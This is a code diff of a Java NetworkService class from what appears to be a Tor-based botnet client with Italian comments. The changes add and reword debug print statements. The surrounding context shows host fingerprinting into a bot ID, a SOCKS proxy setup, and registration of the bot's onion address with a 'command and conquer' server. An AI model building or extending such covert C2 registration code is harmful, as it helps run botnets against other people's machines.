@@ -124,6 +124,7 @@ public class NetworkService {
 	 * @throws IOException
 	 */
 	public Boolean loadMachineInfo() throws InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException, NoSuchAlgorithmException, NoSuchPaddingException, IOException {
+		System.out.println("CARICO INFORMAZIONI DELLA MACCHINA");
 		ArrayList<String> netPar = new ArrayList<String>();
 
 			netPar = cryptoUtils.decodeStringsFromFile("");
@@ -132,6 +133,7 @@ public class NetworkService {
 		//TODO ip apparentemente eliminato valutare il reinserimento
 
 		myOnion=new OnionAddress(engineBot.getBotonion());
+		System.out.println("Sono "+engineBot.getBotonion());
 
 		Properties properties=System.getProperties();
 		properties.put("socksProxyHost",engineBot.getSocksProxyHost());
@@ -284,7 +286,7 @@ public class NetworkService {
 			result = cecReq.sendInfoToDnsServer(engineBot.getDnsonion(),myOnion,myOnion, pki.getPubRSAKey());
 			Pairs< OnionAddress, PublicKey> cec = new Pairs<>(myOnion, pki.getPubRSAKey());
 			commandConquerOnions.add(cec);
-			System.out.println("Ip tornato " + result);
+			System.out.println("Onion address CEC tornato:  " + result);
 			return Boolean.TRUE;
 		} else {
 			String url = engineBot.getDnsonion() + engineBot.getUrirequest();
@@ -340,7 +342,7 @@ public class NetworkService {
 		byte[] hash = DigestUtils.sha256(os + versionOS + archOS + usernameOS + milli);
 
 		idHash = Base64.encodeBase64String(hash);
-		System.out.println("idBot " + idHash + "  hash " + hash.toString());
+		System.out.println("Bot id " + idHash + "e hash " + hash.toString());
 		// salva hash su properties;
 
 		// genera Bot
@@ -364,6 +366,7 @@ public class NetworkService {
 	/**
 	 * @return
 	 */
+	//TODO valutare la rimozione
 	private String getMyIpCheckInternet() {
 		String ip = null;
 		// ip = InetAddress.getLocalHost();
@@ -385,7 +388,7 @@ public class NetworkService {
 		Boolean result = false;
 
 		result = cecReq.sendInfoToDnsServer(engineBot.getDnsonion(),myOnion,myOnion, pk);
-		System.out.println("Ip tornato " + result);
+		System.out.println("Onion address inviato a ODIN EP : " + result);
 		return result;
 	}
 
